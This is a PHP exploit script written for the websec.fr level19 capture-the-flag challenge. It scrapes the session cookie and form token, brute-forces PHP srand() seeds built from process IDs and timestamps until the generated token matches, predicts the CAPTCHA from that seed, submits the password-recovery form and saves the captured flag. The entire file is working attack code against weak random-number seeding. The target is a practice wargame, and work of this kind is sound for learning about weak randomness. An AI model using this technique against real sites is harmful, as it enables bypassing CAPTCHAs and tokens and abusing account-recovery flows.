<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║    PID-BASED ATTACK - Testing process IDs                 ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

$round = 0;

while (true) {
    $round++;
    
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) {
        sleep(1);
        continue;
    }
    
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) continue;
    $session_id = $matches[1];
    
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) continue;
    $real_token = $token_match[1];
    
    echo "[Round $round] Testing PID-based seeds | Token: " . substr($real_token, 0, 10) . "...\n";
    
    // Probar PIDs típicos de procesos web
    $seeds = [];
    
    // PIDs bajos (systemd, init, etc.)
    for ($pid = 1; $pid <= 1000; $pid++) {
        $seeds[] = $pid;
    }
    
    // PIDs típicos de nginx/apache/php-fpm
    for ($pid = 1000; $pid <= 100000; $pid += 1) {
        $seeds[] = $pid;
    }
    
    // Combinaciones de PID + timestamp
    $now = time();
    for ($pid = 1000; $pid <= 10000; $pid += 10) {
        $seeds[] = $now ^ $pid;
        $seeds[] = $now + $pid;
        $seeds[] = $now * $pid % 2147483647;
    }
    
    echo "  Testing " . count($seeds) . " PID-based seeds...\n";
    
    $tested = 0;
    foreach ($seeds as $seed) {
        srand($seed);
        $test_token = generate_random_text(32);
        $tested++;
        
        if ($test_token === $real_token) {
            echo "\n  ✓✓✓ MATCH WITH PID SEED! ✓✓✓\n";
            echo "  Seed: $seed\n";
            
            srand($seed);
            generate_random_text(32);
            $captcha = generate_random_text(25);
            
            echo "  CAPTCHA: $captcha\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\n  SUCCESS!\n";
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "  FLAG: " . $flag_match[0] . "\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                    exit(0);
                }
            }
            break;
        }
        
        if ($tested % 10000 == 0) {
            echo "  Progress: $tested/" . count($seeds) . "\n";
        }
    }
    
    usleep(100000);
}
?>